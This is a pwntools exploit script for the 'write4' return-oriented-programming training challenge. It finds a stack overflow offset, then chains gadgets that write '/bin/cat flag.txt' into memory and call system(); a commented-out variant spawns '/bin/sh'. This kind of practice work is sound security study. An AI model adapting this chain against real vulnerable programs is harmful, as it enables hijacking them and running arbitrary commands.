#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

context.log_level = 'debug'
io = process(exe.path)
io.sendline(cyclic(511))
io.wait()
core = io.corefile
stack = core.rsp
info("stack: %#x", stack)
pattern = core.read(stack, 4)
offset = cyclic_find(pattern)
info("pattern: %r", pattern)
info("offset:  %d", offset)

# CONSTANTS
#bin_sh = 0x2f62696e2f7368
## SOLUTION 1 pop a shell via /bin/sh
bin_sh = 0x68732f6e69622f
pop_r14_r15 = 0x400890
mov_ptr_r14_r15 = 0x400820
data_start = 0x601050
pop_rdi = 0x400893
system = 0x4005e0
system = 0x400810
bin_ls = 0x40090c

got_addr = 0x601028
bin_cat_a = 0x2f62696e2f636174
bin_cat_b = 0x20666c61672e7478
bin_cat_c = 0x7400000000000000

# 1 call pop r14, pop 15, ret
# 2 ptr to data section
# 3 string command (/bin/sh)
# 4 call mov qword ptr [r14], r15
# 5 call pop rdi to put addr of string in rdi
# 6 addr of string
# 7 call system
#info("OPTION 1: Using /bin/sh approach")
#payload = fit({
#    offset: [
#        p64(pop_r14_r15),
#        p64(data_start),
#        p64(bin_sh),
#        p64(mov_ptr_r14_r15),
#        p64(pop_rdi),
#        p64(data_start),
#        p64(system)]
#    })

info("OPTION 2: Using /bin/cat flag.txt approach")
# NOTE: I specify endian="BIG" for the strings so I don't have 
# to reverse the bytes from the conversion tool
payload = fit({
    offset: [
        p64(pop_r14_r15),
        p64(got_addr),
        p64(bin_cat_a, endian="big"),
        p64(mov_ptr_r14_r15),

        p64(pop_r14_r15),
        p64(got_addr+8),
        p64(bin_cat_b, endian="big"),
        p64(mov_ptr_r14_r15),

        p64(pop_r14_r15),
        p64(got_addr+16),
        p64(bin_cat_c, endian="big"),
        p64(mov_ptr_r14_r15),

        p64(pop_rdi),
        p64(got_addr),
        p64(system)]
    })

# testing /bin/ls  - CONFIRMED
#payload = fit({
#    offset: [
#        p64(pop_rdi),
#        p64(bin_ls),
#        p64(system)]
#    })

with open('payload.dat', 'wb') as out_file:
    out_file.write(payload)

io = process(exe.path)
io.sendline(payload)
io.wait_for_close()
lines = io.recv().decode().split('\n')
flag = None
for line in lines:
    if 'flag' in line:
        flag = line
        break
success(flag)

